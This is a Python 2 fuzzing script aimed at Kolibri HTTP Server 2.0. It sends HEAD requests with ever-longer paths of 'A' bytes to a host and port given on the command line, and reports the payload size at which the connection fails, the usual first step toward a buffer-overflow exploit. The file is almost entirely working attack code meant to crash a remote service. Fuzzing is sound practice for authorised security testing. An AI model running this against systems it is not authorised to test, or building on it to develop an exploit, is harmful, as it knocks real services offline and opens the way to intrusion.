#!/usr/bin/env python
import sys
import time
import socket

#----------------------------------------------------------------------------------#
# Kolibri HTTP Server 2.0 Fuzzer                                                   #                                                   #
#----------------------------------------------------------------------------------#

if len(sys.argv) < 3:
	print '[*] Kolibri HTTP Server 2.0 Fuzzer'
	print '[*] Usage: {} <ip addr> <port>'.format(sys.argv[0])
	sys.exit(1)
else:
	rhost = sys.argv[1]
	rport = int(sys.argv[2])


buffer = ["\x41"]
counter = 100
while len(buffer) <= 30:
  buffer.append("\x41" * counter)
  counter = counter + 200

try:
	for string in buffer:
		print '[*] Fuzzing HTTP Server on port {} with: {} bytes'.format(rport, len(string))

		payload = ''
		payload += 'HEAD /{} HTTP/1.1\r\n'.format(string)
		payload += 'Host: {}:{}\r\n'.format(rhost, rport)
		payload += 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n'
		payload += 'Keep-Alive: 115\r\n'
		payload += 'Connection: keep-alive\r\n\r\n'

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = s.connect((rhost, rport))

		s.send(payload)
		s.close()
		time.sleep(0.5)

except socket.error:
	print '[-] Crash with {} bytes'.format(len(string)) 
